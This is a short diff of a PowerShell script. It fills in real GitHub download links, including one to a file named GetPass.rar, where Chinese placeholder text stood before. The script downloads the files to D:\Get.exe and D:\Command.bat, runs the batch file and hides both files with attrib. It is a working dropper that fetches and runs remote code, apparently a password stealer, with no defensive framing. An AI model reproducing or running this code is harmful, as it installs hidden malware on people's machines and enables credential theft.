@@ -1,5 +1,5 @@
-(new-object System.Net.WebClient).DownloadFile('这里添加GET.rar的下载链接','D:\Get.exe');
-(new-object System.Net.WebClient).DownloadFile('这里添加Command.rar的下载链接','D:\Command.bat');
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Hpower96/rar/master/GetPass.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Hpower96/rar/master/Command.rar','D:\Command.bat');
 D:\Command.bat;
 attrib +h Get.exe
 attrib +h Command.dat
